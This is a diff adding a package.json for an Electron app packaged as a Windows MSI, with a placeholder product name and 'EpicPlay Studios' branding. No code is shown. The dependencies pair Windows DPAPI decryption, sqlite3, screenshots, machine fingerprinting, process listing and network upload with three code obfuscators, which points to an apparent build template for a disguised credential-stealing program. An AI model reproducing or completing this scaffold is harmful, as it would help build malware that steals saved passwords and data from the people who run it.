@@ -1,0 +1,53 @@
+{
+  "name": "%YOUR_NAME%",
+  "version": "1.0.0",
+  "main": "vy.js",
+  "scripts": {
+    "start": "electron .",
+    "build": "electron-builder",
+    "rebuild": "electron-rebuild"
+  },
+  "keywords": [],
+  "author": "EpicPlay Studios",
+  "license": "MIT",
+  "description": "%YOUR_NAME%",
+  "dependencies": {
+    "@primno/dpapi": "^1.1.2",
+    "adm-zip": "^0.5.16",
+    "axios": "^1.7.9",
+    "form-data": "^4.0.1",
+    "javascript-obfuscator": "^4.1.1",
+    "js-confuser": "^2.0.0",
+    "node-fetch": "^3.3.2",
+    "obfuscator-io": "^1.0.0",
+    "ps-node": "^0.1.6",
+    "socket.io-client": "^4.8.1",
+    "sqlite3": "^5.1.7",
+    "systeminformation": "^5.23.14",
+    "ws": "^8.18.0",
+    "node-machine-id": "^1.1.12",
+    "screenshot-desktop": "^1.14.0"
+  },
+  "devDependencies": {
+    "electron": "^33.2.1",
+    "electron-builder": "^25.1.8",
+    "electron-rebuild": "^3.2.5"
+  },
+  "build": {
+    "appId": "com.epicplaystudios.%YOUR_NAME%",
+    "productName": "%YOUR_NAME%",
+    "files": [
+      "vy.js",
+      "assets/**"
+    ],
+    "directories": {
+      "output": "dist"
+    },
+    "publish": null,
+    "win": {
+      "target": "msi",
+      "artifactName": "%YOUR_NAME%.msi"
+    },
+    "icon": "assets/vy.ico"
+  }
+}
